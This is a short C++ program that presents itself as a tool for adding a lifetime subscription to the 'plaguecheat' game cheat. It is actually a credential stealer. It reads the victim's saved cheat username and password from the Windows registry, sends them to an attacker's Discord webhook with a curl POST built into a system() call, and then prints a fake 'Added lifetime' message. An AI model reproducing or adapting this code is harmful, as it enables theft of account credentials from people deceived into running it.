#include <iostream>
#include <Windows.h>


const char* cWebhook = "PUT YOUR DISCORD WEBHOOK URL HERE";


//credits to https://stackoverflow.com/a/35717/16318032
LONG GetStringRegKey(HKEY hKey, const std::wstring& strValueName, std::wstring& strValue, const std::wstring& strDefaultValue)
{
    strValue = strDefaultValue;
    WCHAR szBuffer[512];
    DWORD dwBufferSize = sizeof(szBuffer);
    ULONG nError;
    nError = RegQueryValueExW(hKey, strValueName.c_str(), 0, NULL, (LPBYTE)szBuffer, &dwBufferSize);
    if (ERROR_SUCCESS == nError)
    {
        strValue = szBuffer;
    }
    return nError;
}

int main()
{
    SetConsoleTitle(L"plaguecheat lifetime sub hacker add 100% real no scam");

    HKEY hKey;
    LONG lRes = RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\zzplaguecheat", 0, KEY_READ, &hKey);
    bool bExistsAndSuccess(lRes == ERROR_SUCCESS);

    if (bExistsAndSuccess)
    {
        std::wstring wsUsername;
        std::wstring wsPassword;
        GetStringRegKey(hKey, L"username", wsUsername, L"0");
        GetStringRegKey(hKey, L"password", wsPassword, L"0");

        if (wsUsername == L"0" && wsPassword == L"0")
            return 0;

        char cBuffer[255];

        std::string sUsername(wsUsername.begin(), wsUsername.end());
        std::string sPassword(wsPassword.begin(), wsPassword.end());

        sUsername.erase(std::remove(sUsername.begin(), sUsername.end(), '\n'), sUsername.end());
        sPassword.erase(std::remove(sPassword.begin(), sPassword.end(), '\n'), sPassword.end());

        snprintf(cBuffer, sizeof(cBuffer), "curl -X POST -H \"Content-Type: application/json\" -d \"{\\\"content\\\":\\\"https://plaguecheat.cc/ login info found!\\n\\nusername: %s\\npassword: %s\\\", \\\"avatar_url\\\":\\\"https://i.imgur.com/WLaVXG7.png\\\", \\\"username\\\":\\\"PlagueStealer\\\"}\" ", sUsername.c_str(), sPassword.c_str());
        const char* cRequest = cBuffer;
        std::string what;
        what.append(cRequest);
        what.append(cWebhook); //????

        system(what.c_str());

        std::cout << "Added lifetime to your plague subscription!!!\n";
        system("pause");
    }

    return 0;
}